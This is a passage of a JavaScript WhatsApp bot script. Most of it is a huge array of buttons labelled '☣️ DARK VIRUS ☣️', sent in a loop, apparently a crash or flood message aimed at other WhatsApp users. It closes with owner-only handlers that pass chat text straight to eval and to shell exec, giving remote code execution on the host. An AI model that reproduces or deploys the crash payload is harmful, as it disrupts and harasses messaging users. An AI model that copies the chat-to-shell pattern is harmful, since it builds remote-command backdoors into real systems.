{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quoted: lep }
]})}
await sleep(ms(waktu))
break

break
default:
}
if (budy.startsWith('=>')) {
if (!itsMediablo) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return diablobotwhatsapp.reply(bang)
}
try {
diablobotwhatsapp.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
diablobotwhatsapp.reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!itsMediablo) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await diablobotwhatsapp.reply(evaled)
} catch (err) {
diablobotwhatsapp.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!itsMediablo) return
try {
return diablobotwhatsapp.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!itsMediablo) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return diablobotwhatsapp.reply(`${err}`)
if (stdout) {
diablobotwhatsapp.reply(stdout)
}
})
}
} catch (err) {
diablobotwhatsapp.reply(util.format(err))
}
} 